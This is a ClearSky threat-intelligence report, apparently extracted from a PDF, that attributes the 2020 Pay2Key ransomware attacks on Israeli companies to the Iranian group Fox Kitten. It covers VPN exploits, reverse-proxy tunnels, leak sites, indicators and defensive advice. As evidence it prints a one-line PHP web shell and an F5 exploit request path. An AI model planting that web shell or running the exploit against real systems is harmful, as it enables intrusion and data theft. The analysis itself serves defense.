Pay2KittenPay2KittenPay2Key Ransomware – A New Campaign by FoxKittenDecember 2020TLP:WHITE____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White1 | P a g ePay2KittenContentsExecutive Summary 3About Fox Kitten 5Tools Used by the Pay2Key and Their Similarities to Fox Kitten 6Tools and Offensive Techniques Categorized with MITRE ATT&CK 6Pay2Key – November 2020 8TTPs 8Attacking Vector 8Communication with Pay2Key and Data Leaks 11Previous Link to Iran 13Pay2Key – December 2020 15Updated TTPs 15Exploitation 15FRP 15Persistency 15Command and Control Communication 16Leaks 16Fox Kitten 18Technological Similarites 18Exploitation and Local User 18Tool Set Overlaps 19Command and Control 21Thematic Similarities 22Timeline 22Recommendations and Insights 24The Attackers 24The Attack Infrastructure 24Indicators of Compromise 26Hashes 26C2 Compromised Addresses 27Domains 27____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White2 | P a g ePay2KittenIntroduction Executive SummaryDuring the past four months a wave of cyber-attacks has been targeting Israeli companies. The attacks are conducted by different means and target a range of sectors. We estimate with medium to high confidence that Pay2Key is a new operation conducted by Fox Kitten, an Iranian APT group that began a new wave of attacks that entailed dozens of Israeli companies in July-August 2020.Fox Kitten Timeline2017-2019 • Fox Kitten First Campaign • Dargos: Parisite leadFebruary 2020 • ClearSky: Fox Kitten report • Citrix: New vulnerability used by the groupSeptember 2020 • CISA report about Fox KittenAugust 2020 • FBI Alert - Big F5 vulnerability is used by the groupJune 2020 • Attempts to sell victim's access in underground forums • FRPC unique tokenJuly 2020 • First attempt to exploit F5 webshell - first identifierDecember 2020 • Fox Kitten 2 - Pay2KittenFox Kitten operations during 2017-2020The Pay2Key‘s ”Modus Operndi” was to execute a Ransomware attack, potentially to mislead the victim. The attacker penetrates companies’ internal networks, encrypts servers and workstations, steals and leaks information. Also, this actor conducts “supply chain attacks” by compromising companies using accessibility or information that was obtained in breached companies. During October and November, we observed a wave of cyber-attacks on industrial and insurance companies. In November we observed a new wave of attacks on logistics companies. This figure summarizes the timeline of the Pay2Key campaign in Israel between June and December of 2020.____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White3 | P a g ePay2KittenPay2Key TimelineJune 2020 • First confirmed victim • Malware execution on 'Patient Zero' • Swascan public reportNovember 2020 • First wave of attack in • Compromising AmitalDecember 2020 • Second wave of attack (Supply chain attack) • Leaking via Twitter • Pay2Kitten ReportPay2Key operations between June 2020 – December 2020We believe that this campaign is part of the ongoing cyber confrontation between Israel and Iran, with the most recent wave of attacks causing significant damage to some of the affected companies. The entry vector mostly consists of well-known vulnerabilities covered in our Fox Kitten reports throughout the year. The attacks themselves or the abuse of successful attacks to compromise additional companies or service providers were conducted using obfuscating means, making the discovery of the attack more difficult.We assess - with a medium level of confidence - that the Pay2Key campaign is aimed to create panic in Israel. The ransomware group pay2key publicly threatened Israel, this might indicate that this operation is only a propaganda campaign to cause fear and to divert attention from Fox Kitten. That would explain the decision to leak the data instead of just demanding ransom. It can also explain why this actor chose to leak the data via public social media platforms and to include threats directed at Israel.December Darknet Leak site by Pay2Key____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White4 | P a g ePay2KittenDecember Keybase Leak site by Pay2KeyleaksAs mentioned before, we attribute the campaign to Fox Kitten (corresponding report published in February1) with a medium-high level of confidence. About Fox KittenLast November, we located a malicious file that we associated with an Iranian operation that was named “Parisite” by Dragos. In February 2020 we exposed the Fox Kitten group, an Iranian campaign that targeted companies in Israel and around the world using dozens of distinct tools. Organizational vulnerabilities are exploited to install multiple tools that will enable attackers to remotely connect to the network and establish persistence for espionage and further infection (to other companies as well). In August, the FBI published an alert regarding a new Fox Kitten capability. The group attacks a plethora of targets in various sectors around the world, including in Israel. The information that the group habitually exploits VPN vulnerabilities (such as Citrix or Fortinet) was familiar to ClearSky.On September 15th, a CISA report regarding the Fox Kitten campaign was published with an FBI alert uncovering new vulnerability exploitations by the same campaign. The report adds confirmation to the previous report published by ClearSky in February, providing additional evidence that the perpetrator was an Iranian attacker.An additional report was released on September 15th, concerning the various web shells installed on the target network (as reviewed in the Fox Kitten report). A number of public WSs utilized by the group appeared in the report. The report also included FRPC configuration – FRP is a public remote connection tool used by the group to create tunnels inside the attacked organization’s internal network.Analyzing the recent attacks conducted by the threat actor Pay2Key led us to the assess that there are overlaps between Fox Kitten to Pay2Key. In the following chapter, we examine the tool set used by Pay2Key group and compare it to Fox Kitten tool set. In the last chapter of the report, we provide a detailed comparison between the two groups based both on technical and thematic analysis.1 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White5 | P a g ePay2KittenTools Used by the Pay2Key and Their Similarities to Fox KittenIn the recent ‘Pay2Key’ attacks in Israel, the group used a few malicious files to achieve their goals. Moreover, we were able to identify a number of methods that overlap with the tool set of Fox Kitten.The different tools and techniques used by the group are divided in the following table into four types:1. Exploitation of vulnerabilities in VPN tools at the initial stage in the targeted organizations.2. Methods designed for privilege escalation, persistence and creating a tunnel for RDPconnections and information theft.3. Post-exploitation tools used for C2 server communication and data exfiltration, after theadversary has ensured its foothold on the target.4. Ransomware tool – Pay2Key ransomware.Tools and Offensive Techniques Categorized with MITRE ATT&CKThe following table shows the overlaps between the tools and techniques that we have found in the operation in comparison to the Fox Kitten group.Kill Chain PhaseTitleTechniques, Tools ProceduresandMITRE ATT&CKFox Kitten SimilarityReconnaissanceTechniquesRDP Brute ForceTechniquesASP SQL injectionsProceduresVulnerability scanningBrute Force - T1110 Exploit Public-Facing Scanning - T1046ExploitationTechniquesCVE-2018-13379 CVE-2019-19781 CVE-2020-5902External Remote Services - T1133ExecutionToolsPERLCommand and Scripting Interpreter - T1059InstallationToolsSCCM.exe (LanProxy) FRPC.exe (FRP Client)Scripting - T1064--Fox Kitten identified vulnerable servers Fox Kitten used 2018-2020. Moreover, the group used Citrix and Big F5 vulnerability, since February and June respectively Fox Kitten used a PERL shell script as part of their exploitation process The group used the payload of these files____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White6 | P a g ePay2KittenUser Execution: Malicious File – T1204.002TechniquesLocal WebshellLocal Web Shell – T1100TechniquesProcess InjectionToolsNgrokToolsFRPCCommand & Control (C2)TechniquesRDP connectionProcess Injection – T1055 Connection Proxy - Free tool T1090Connection Proxy - Free tool T1090Custom Command and Protocol – T1076TechniquesCommunication with C2Web Service – T1102ProceduresScheduled TaskScheduled Task/Job - T1053Actions on ObjectivesProcedurestLocal Admin / UserCreate Account – T1136ToolsPay2Key ransomwareData Encrypted for Impact - T1486Fox Kitten installed local WebShell in the victim’s network-Fox Kitten used these tools to enable machine to their C2 Fox Kitten main designated to enable the attacker used an RDP to connect to Fox Kitten created Scheduled task to gain persistency Fox Kitten created local user with Admin privileges-____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White7 | P a g ePay2KittenPay2Key – November 2020In November 2020, a threat actor named Pay2Key conducted ransomware attacks which were primarily targeted at Israeli companies. The attacker worked fast, succeeding to penetrate companies’ networks by exploiting known vulnerabilities. The attitude of the group towards the victims is exceptionally “unprofessional”, as the attacker is overly cynical, mocks his victims and in several cases di not hand over decryption keys after payment.In this chapter we analyze the toolset of Pay2Key. TTPsAttacking VectorKeyBase – First sign of the campaign infrastructureIn June Pay2Key created their KeyBase account.The first known Pay2Key ransomware executable compilation date is set to October 26th, 2020. A day later Pay2Key’s KeyBase account had a new key generated:____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White8 | P a g ePay2KittenOn this same date Swascan published the first public report detailing the Pay2Key ransomware2. The report describes attacks in Europe in which, the adversary had access to the systems a week prior to the encryption, from October 20th, 2020.The attacker attempts to manually breach organizational systems by exploiting the following vulnerabilities or vulnerable products:Initial Entry- Microsoft Exchange Server- RDP vulnerabilities and brute forcing RDP server credentials-VPN VulnerabilitiesEstablishing a Backdoor Using Reverse ProxyWhen investigating one of the attacks, we identified that the attacker utilizes publicly available tools, such as FRPC3 or Go Proxy4, to enable Reverse Proxy5 in an infected machine.The configuration file accompanying the FRPC – Reverse Proxy tool was observed in one of the files uploaded for analysis and research. The organization’s name is encoded in the file:2 url 3 github.com/fatedier/frp 4 github.com/ffay/lanproxy 5 en.wikipedia.org/wiki/Reverse_proxy____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White9 | P a g ePay2KittenMoreover, we identified a version of LanProxy written in Go language. Its purpose is the same as the FRP, this file is used to open a reverse proxy between the compromised machine to the attacker’s C2.Pay2Key RansomwareThe attacker’s methods of conducting lateral movement across the network and taking control of additional servers and services is still unclear. However, we have noted that the attacker downloads two files to the path C:\Windows\Temp\[organization-name]tmp\ after obtaining initial access to the organizational network:- The Pay2Key ransomware: Cobalt.Cobalt.exe- The ransomware’s configuration file: Config.iniThe ransomware is written in C++. Exceptionally, as other ransomware groups encrypt their ransomware files or at least obfuscate internal strings to make analysis more difficult, Pay2Key executable is unpacked and strings can be seen in clear text:The debug data has been left in the executable enabling researchers to observe the ransomware’s structure and navigate through its functionality. In several instances, the ransomware crashed or failed to decrypt the files after the victim paid the ransom.The ransom message in the readme file states that all organization’s files have been encrypted, demanding a ransom to release them, as it does in all ransomware attacks focused on extortion. If the ransom is not delivered, the files and any information they contain will be leaked online.The ransom itself ranged between seven and nine Bitcoin (with a few cases in which the attacker was negotiated down to three Bitcoin). To pressure victims into paying, Pay2Key’s leak site displays sensitive information stolen from the target organizations and makes threats of further leaks if the victims continue to delay payments.____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White10 | P a g ePay2KittenFor more information about the Pay2Key ransomware, please check CheckPoint report6.Command and Control Server ArchitecturePay2Key can operate without being connected to its C2s. the ransomware depends on the C2 servers to receive information, such as the types of files it should encrypt, the organization’s name, the ransom message’s contents, and other details.The ransomware receives the C2s’ IP addresses from its configuration file. In contrast to other ransomware that usually connect to the C2 directly, Pay2Key initially connects to a single local computer in the organizational network and designates it to use Reverse Proxy services. This computer constitutes an intersection between the target network and the C2 servers. Communication with Pay2Key and Data LeaksThe attacker registered in the Keybase.io service, which enables encrypted communications over the internet and payments with the Stellar crypto currency. The attacker notably demands payments in Bitcoin to other wallets despite being registered to a Stellar based platform.The attacker opened his account in Keybase.io on June 28th, 2020. We believe that this is the date in which the initial preparations for the attacks began. This profile was then linked to communication devices and a crypto wallet address by the attacker. At a certain stage of the process, the attacker added the address of their leak site to their profile:6 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White11 | P a g ePay2KittenOn November 12nd 2020, CheckPoint published their second report regarding Pay2Key7, the report describes the creation of a leak site for the Pay2Key ransomware. Ransomware leak sites are a recent popular trend, all the notoriously famous ransomware groups have one. The leak site of Pay2Key is anonymized and only accessible via TOR, but we believe it is hosted on AWS EC2 infrastructure.In the beginning of the operation the leak site was very minimalistic, and it contains only files from Israeli targets.Each of the compromised companies has a dedicated ransom note written by the Pay2Key operators. Here is an example for one of them:From the wording we can see the adversary is thoroughly inspecting the attacked asset prior to the encryption. Traditional ransomware groups do that as well in order to achieve maximum efficiency in7 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White12 | P a g ePay2Kittenthe operation so that the target would have to pay the ransom in order to restore normal operations. However, at the end of the message we can see that the adversary continued to control the network even after the encryption was completed and the ransom was paid. Previous Link to IranCheck Point published an additional report following the attacker’s possible identity on November 12th . Aided by Whitestream, Check Point surveilled the Bitcoin wallets that received ransom payments from victims. According to their joint research efforts, the currency was transferred to a mid-point wallet from which it was transferred again to a wallet associated with an Iranian crypto exchange named Excoino:The research report notes that in order to register with the Excoino exchange, a user must provide an Iranian phone number and Iranian identification means. This supports the assumption that the attacker (or multiple attackers) possesses an Iranian means of identification. CheckPoint state this as sufficient ground to attribute the attacks to Iran and identify the attackers as an Iranian attack group.In our research, we identified that the name and image of the profile lead to a cryptography project named “EOSIO UTXO”. This project is also named Pay2Key and displays an identical profile image:____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White13 | P a g ePay2KittenThe purpose of this project is to manufacture “smart contracts” based on the EOS crypto currency Blockchain.____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White14 | P a g ePay2KittenPay2Key – December 2020Amital is an Israeli software company that was breached by this threat actor8. Leveraging Amital’s network with a supply chain attack method, Pay2Key spread to over 40 firms from Israel.The attacker used the same ransomware file from November and added several new tools to his tool set. In this chapter, we will examine the current attack by Pay2Key. Updated TTPsExploitation The analysis of the infrastructure of Habana identified a vulnerable Fortinet server that was breached and its credentials were leaked to an underground forum. This server was vulnerable to Fortinet SSL VPN (CVE-2018-13379)9.We assess that this server was hacked by the threat actor using this exploit.FRP By monitoring this threat actor, we identified an FRPC tool, sharing the same IP address that was part of the December infrastructure according to the INDC alert and we attributed it to Fox Kitten. This file was deployed to the victim’s network via another tool packed with MPRESS Packer. The deployed file “svchost.exe” is a compiled version of the FRP Client tool.As in the previous FRPC file, the organization’s name is written:Persistency This adversary created an account on the victim’s compromised asset with admin privileges. The attacker used the following credentials:Username: DefaultAccounts$Password: Kharpedar123!8 url cyberattack-continues-1.9375486 9 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White15 | P a g ePay2KittenCommand and Control Communication In the Sawnscan report about Pay2Key10, the company presented dllhost.exe as one of the applications used by the attack to be able to access the compromised asset. This file is a version of Ngrok software that was hidden in the victim’s computer since the attacker hacked it.LeaksIn Mid December 2020, Pay2Key changed the appearance of their leak site. The leak site now has a background image with the map of Israel. This was most likely done after the public announcement that Intel Habana Labs were encrypted by Pay2Key. Habana Labs is an Israeli start-up that was acquired by Intel.11The current leak site has all the “official” ways Pay2Key communicate, mail, KeyBase and Twitter.10 url 11 Source: Swascan report____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White16 | P a g ePay2KittenUnlike the first wave, the Pay2Key attacker contacts its followers and the Israeli media via Twitter account instead of a telegram channel. This time, the threat actor focuses specifically on Israeli victims, as is presented in the next picture.____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White17 | P a g ePay2KittenFox KittenIn our analysis, we identified two types of similarities between Fox Kitten group and the recent attacks executed by Pay2Key: Technological similarities and thematic similarities. In this chapter, we present an overview of these similarities and the overlaps between Pay2Key and Fox Kitten. Technological SimilaritesExploitation and Local User In the forensic research we conducted about the Fox Kitten campaign, we identified three main vulnerabilities that were exploited among the victims. Following this, further research by CISA, which is associated with the United States Department of Homeland Security, has revealed two additional vulnerabilities which are being used by the group12. We have witnessed attempts to exploit the CITRIX vulnerability in Israel since February 2020 and the Big F5 vulnerability since June 2020 (based on information we received from our partners). The following is the summary of vulnerabilities we attribute with high probability of being potentially exploited by the group:• CVE-2019-11510 Pulse Secure• CVE-2018-13379 Fortinet FortiOS• CVE-2018-1579 Palo Alto Networks VPN• CVE-2019-19781 Citrix NetScaler• CVE-2020-5902 BIG-IP (F5 Networks)Additionally, a password was presented as an indicator on the Israel National Cyber Directorate's report:Kharpedar123!This password contains of two Persian words connected to each other. Khar meaning "donkey" and Pedar meaning “father”. This is not a common expression in Persian, and it is used as a way of cursing. A similar expression in Persian is pedar-e sag (father's dog) which is usually used when referring to the US and used for mockery purposes.In our investigation, we identified utilization of this password, as mentioned before, in the victims’ network. This name was used as a password for a local user with high privileges, that the actor created in the victim’s machine. This method was executed by both Fox Kitten and Pay2Key, sharing the same password for both.12 url Based_Threat_Actor_Exploits_VPN_Vulnerabilities_S508C.pdf url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White18 | P a g ePay2KittenRIFT's report from July revealed that in the F5 vulnerability there was a use of a WebShell with a reused password from the exploit of CITRIX vulnerability13, which corresponds to the dates where the group exploited this vulnerability14:<?php @eval(base64_decode($_POST['citrix@kharpedar']));?>This file has also been reported in the CISA report about the WebShell use by this group. This file was uploaded to VT from the US with three artifacts used by the threat actor to conduct this exploitation:As can be seen, this is a reused web shell from Citrix used to exploit CVE-2019-19781 (Citrix NetScaler). In the Fox Kitten report, we reported three main vulnerabilities the group used, and by February 2020, we observed an exploitation of CVE-2019-19781 as well. In July, the FBI also reported15 the exploitation of vulnerability in F5 networking devices. Therefore, we attribute the password “Kharpedar” to both Citrix and F5 exploitations, as well as the Pay2Key attack.Tool Set Overlaps Both Fox Kitten and Pay2Key used two reverse proxy/SSH tools. In February, we reported that we observed Fox Kitten utilize FRPC and Ngrok to open the tunnel between the compromised machines to the C2.As mentioned before, Pay2Key also used Ngrok (according to swascan16). In our analysis, we also identified an FRPC used by Pay2Key, which goes by the name dllhost.dll. This file shares the same token, as can be seen from the FRPC Token sub-chapter below. The malware that was used to deploy the FRPC tool to the compromised asset is named “svchost.exe”. According to Intezer analysis17, This file (by Pay2Key) shares 97.47% of its genes with the same file name that Fox Kitten used in CISA report.Based on this file, we identified a PERL18 reverse shell used by Fox Kitten, which also communicated with Amazon hosted C2. The same Amazon server was observed serving the FRPC.EXE that was used in Pay2Key attacks.13 url intelligence / 14 url intelligence/ 15 url 16 url 17 url url 18 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White19 | P a g ePay2KittenFRPC TokenIn the first Fox Kitten report, we exposed the utilization of Fast Reverse Proxy (FRP) as one of the methods Fox Kitten used during the three years of their operation. One of the tools they used in February was FRPC19, an open-source tool that enables the exposure of a local server behind a NAT or a firewall to the internet, based on the reverse proxy method.In CISA report about Fox Kitten’s WebShell, they also presented a version of the FRPC tool configuration used by this threat actor. The file name was dllhost.dll – same as the files we identified in Pay2Key campaign. Here is the configuration file of the FRPC presented by CISA20:As can be seen, this configuration shares the same token as the Pay2Key FRPC configuration:Note that the FRPC token was entered manually, indicating a single-value token21. Therefore, the overlap between the FRPC token of Fox Kitten and the FRPC token of Pay2Key is strong evidence of the connection between the groups.Since FRP Clients need to connect to an FRP Server, the server token for both Pay2Key and Fox Kitten is the same.19 url 20 url 21 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White20 | P a g ePay2KittenAnother FRPC’s configuration used that includes this token was uploaded to VT in June 2020. This file also has server_addr parameter, which point to the following IP address, hosted in Amazon cloud22:54.174.216[.]48A comment in VirusTotal23 on this IP with logs of this server point to the aforementioned F5 report by NCC Group. This server was used in attempted exploitation of the F5 vulnerability (CVE-2020-5902):2020-07-06 16:07:55 /tmui/login.jsp/ ;/tmui/locallb/workspace/tmshCmd.jsp curl/7.58.0Also, a similarity of the WebShell was identified. Here is a comparison between the logs and the F5 report by NCC Group24:This exploitation attempt results in the creation of php WebShell with the citrix@kharpedar string.Thus, we identified the same token used by Pay2Key in 2 different FRPC’s configuration, one of which point to a C2 server that attempted to exploit a known vulnerability that Fox Kitten use (which also includes the ‘Kharpedar’ phrase).Command and Control As mentioned before, Fox Kitten used Amazon servers before, the same as Pay2Key. One of the servers we identified in the attack at “Amital”, was attributed by us to Fox Kitten before it was embedded in Pay2Key attack.It is noteworthy to mention that according to the Israel National Cyber Directorate's report, there was a use of a domain called tunnels4[.]me which is on the following IP address: 63.32.140[.]129. On this IP address we have identified an updated domain which is allegedly impersonating 2Bsecure company. However, we do not have a way to associate this information with Fox Kitten's activity, except for the fact that the mentioned control server contains an option to connect with SSH:22 During our initial Fox Kitten analysis, we observed multiple Fox Kitten servers hosted in Amazon. 24 url intelligence/____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White21 | P a g ePay2KittenThematic SimilaritiesWe believe that this attack was conducted by Fox Kitten. We have also identified an old user, named kharpedar that was active in a few sensitive forums and engaged with penetrating sensitive organizational networks. This user is now active under a different name in a few underground forums. In one of these forums, the user has presented its new name with the following message, which makes us believe it is an Iranian attacker.It is noteworthy to mention that other research companies with which we collaborate, also associate this user with Fox Kitten. However, we would like to emphasize that we have no way of determining whether the user was active independently on this forum or on behalf of the Iranian government, selling the data which was obtained by the group. In one of his declarations, he emphasizes that he has accessibility to governmental organizations in Turkey, and in another declaration, he says that India is not an attractive destination for him. In addition, the breach to the holding company Raytheon is another indication (although weak) for the sector on which the Iranian APT33 group focuses. TimelineHere is a chart summarize the Fox Kitten and the Pay2Key timelines:2020FebruaryJuneJulyAugust September OctoberFox KittenPay2KeyClearSky’s Fox Kitten report Citrix: New vulnerability used by the group Attempts to sell victims’ access in underground forums First attempt to exploit Big IP F5 vulnerability citrix@kharpedar WebShell – first identifier FBI Alert – Big F5 vulnerability is used by the group CISA report about Fox KittenKeyBase account--- --First identified access to a vulnerable server Ransomware compilation Malware execution on ‘Patient Zero’____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White22 | P a g ePay2KittenSwascan public report First wave of attacks in Israel – Leaking information via TOR site Second wave of attacks in Israel Compromising multiple companies (Supply Chain attack) Leaking via Twitter Visual change on leak siteNovemberDecember--____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White23 | P a g ePay2KittenRecommendations and InsightsThis report reveals a strong connection between two groups that were formerly considered to be separate units. In recent months, several reports dealing with tools common to pay2key and Fox Kitten were published. The report shows a direct link between pay2key ransomware attacks which all had Fox Kitten tools used in them. The Attackers• The Iranian offensive establishment has reached the level of knowledge and flexibility which allows it to use “1 Day” vulnerabilities, i.e. development and distribution of malware using publicly revealed vulnerabilities, in a period of hours to days since their publication.• We assess that Pay2Key, or Fox Kitten, understands that a direct attack on defense systems is much more difficult than infiltration using VPN systems that bring you directly to the target’s core systems, and that this method is also much more cost effective.• The ransom demand is low compared to other known ransomware gangs; this is an incentive to pay the cheap ransom. The ransom is most likely just a bonus, since the group’s main motivation so far is espionage.• We suspect that not all Fox Kitten targets were encrypted with ransomware, in some data was only exfiltrated. We assess that one of the options is the ransomware was applied to targets that are not the focus of Fox Kitten, while the main targets were left unencrypted in order to keep the attack covert.• We also suspect that the adversary engages in RDP brute force attacks as well as SQL injections on ASP systems. This is because they run on Microsoft Windows systems, which is the only operating system in which the attacker has been observed doing a lateral movement across the organization.The Attack Infrastructure• VPN systems which allow remote access to corporate systems comprise a significant risk, because they essentially bypass all defense systems deployed vis-à-vis the internet. Review and assessment are needed in order to understand whether the systems are controlled and monitored completely by the organization.• The adversary has used the password “kharpedar” in the web shells and in the local windows accounts they created for persistence and lateral movement. It means that the attacker first gained initial foothold access and then escalating privileges and moving latterly across the organization to get to the AD. Monitoring local users and privileges in the organization is essential for identifying unwanted users within the network.• The attackers have used AWS EC2 infrastructure to carry their attacks, it is strongly advised to audit all incoming connections from AWS EC2 to your organization to make sure all the____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White24 | P a g ePay2Kittenaddresses are known to you, as one of those possible addresses might be in use by the adversary.• The recommended timeframe to install a security patch after the vulnerability has been published has shortened and we assess it to be between 24 hours and a week between the vulnerability’s publication and the moment it becomes a real threat for the organization. This can be seen in the F5 exploitation attempts in the NCC report.• Checking outward facing systems, including different VPN systems, is critically important for the company. There is a need for constant monitoring, making sure that the systems are constantly updated, and preventing unneeded exposure of the administration interfaces to the outside world. Constantly check for security updates to VPN systems.• After each update performed on core corporate systems, including VPN systems, it is recommended to reset all passwords to all end users in the organization and to oblige all users to re-connect to the services, in order to identify unwanted connections.••It is highly recommended to create a two-step authentication to the corporate core systems VPN access.It is recommended to use VPN services that keep logs on a different media (preferably non- erasable) during communication.• Users permission’s and active users on each station should be monitored constantly. In this campaign, the attackers have created, multiple times, local users that allowed them to act freely.•If your organization possesses one of the affected software it is highly recommended to perform a full reset of the AD forest as described here under “Comprehensive Account Resets” section.• The attack infrastructure attached to this report should be monitored and blocked.Recommended sources:url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White25 | P a g ePay2KittenIndicators of CompromiseHashesHashFile NameTypeVirus Total Executablefrps.exeIsraelsvchost.exeIsraelDllhost.dllUK- zero (Fox Kitten)Text – FRPC configuration (Fox Kitten)Text – FRPC C2 Compromised AddressesFile NameTypeVirus Total Significant Submitterdc.plUSA - Zero ExecutableThe following domains were successfully accessed by the attack group to be used as malware download websites:IP AddressASN and ISP52.90.144[.]40AS 14618 ( Amazon.com, Inc. )3.237.39[.]7254.174.216[.]4863.32.140[.]12913.81.213[.]207 Domainstunnels4[.]me2bsecure[.]techAS 14618 ( Amazon.com, Inc. ) AS 14618 ( Amazon.com, Inc. ) AS 16509 ( Amazon.com, Inc. )AS 8075 ( Microsoft Corporation )____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White27 | P a g ePay2KittenClearSky Cyber Security Intelligence Report2020 (C)All rights reserved to ClearSky Security Ltd.TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction.Photo by Miguel Á. Padriñán from Pexels____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White28 | P a g e 